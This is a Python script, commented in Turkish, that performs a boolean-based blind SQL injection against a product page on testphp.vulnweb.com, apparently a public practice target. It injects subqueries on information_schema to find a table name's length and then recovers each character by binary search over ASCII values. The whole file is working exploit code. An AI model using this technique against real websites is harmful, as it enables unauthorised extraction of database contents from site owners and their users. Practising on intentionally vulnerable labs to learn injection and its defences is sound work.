# -*- coding: utf-8 -*-
# BLIND SQL injection test
# CANERC 190725
# KORAYY 190725
import requests

# GLOBAL degiskenler
url = "http://testphp.vulnweb.com/product.php?pic=1"
valid_text = "pageName"


# bu fonksiyon ulasilmaya calisilan tablonun adının
# kac karakter oldugunu hesaplamaktadir.
def find_table_length(url):
    i = 3
    res = requests.get(url)
    while True:
        sql_payload = " ((SELECT length(table_name) from " + \
                      " information_schema.tables where " + \
                      " table_schema=database() LIMIT 1) = " + \
                      str(i) + ")"
        vuln_url = url + " and " + sql_payload
        vuln_res = requests.get(vuln_url)
        if valid_text in vuln_res.text:
            # print("Found at", i)
            break
        i = i + 1
    return i


# bu fonksiyon, özyinelemeli (recursive) olarak tablonun adındaki
# incelenen pozisyonda bulunan karakterin ascii degerini sayfadan alan
# true/false degerleri yardimiyla bulmak amaciyla kodlanmistir.
# binarySearch algoritmasının bir uyarlamasıdır.
def binarySearch(min_val, max_val, str_pos):
    guess = round((min_val + max_val) / 2)
    # print(guess)
    sql_payload_lt = "ascii(substring( (SELECT table_name from " + \
                     "information_schema.tables " + \
                     "where table_schema=database() " + \
                     "LIMIT 1), " + \
                     str(str_pos) + ", 1))" + \
                     "<" + str(guess)

    sql_payload_gt = "ascii(substring( (SELECT table_name from " + \
                     "information_schema.tables " + \
                     "where table_schema=database() " + \
                     "LIMIT 1), " + \
                     str(str_pos) + ", 1))" + \
                     ">" + str(guess)

    vuln_url_lt = url + " and " + sql_payload_lt
    vuln_res_lt = requests.get(vuln_url_lt)

    if valid_text in vuln_res_lt.text:
        return binarySearch(min_val, guess, str_pos)
    else:
        vuln_url_gt = url + " and " + sql_payload_gt
        vuln_res_gt = requests.get(vuln_url_gt)
        if valid_text in vuln_res_gt.text:
            return binarySearch(guess, max_val, str_pos)
        else:
            # print('guess:', chr(guess), 'pos:', str(str_pos))
            return guess


# bu fonksiyon ana fonksiyon olup uzunluğu ve karakter sayisi bilinen
# tablo adının herbir karakternin ascii degerini bulmak için yazılmis
# bir döngü ve sonuçlari birlestirmeye yarar.
def find_table_name(url, len_table):
    offset = 0
    table_length = find_table_length(url)
    ascii_min_val = 32
    ascii_max_val = 126
    table_name_str = ''

    res = requests.get(url)
    # while True:
    for i in range(table_length):
        str_pos = i + 1
        # ascii_guess_char = chr(binarySearch(ascii_min_val, ascii_max_val, str_pos))
        table_name_str += chr(binarySearch(ascii_min_val, ascii_max_val, str_pos))
    return table_name_str


# ana program
def main():
    len_table = find_table_length(url)
    # print(len_table)
    print(find_table_name(url, len_table))


main()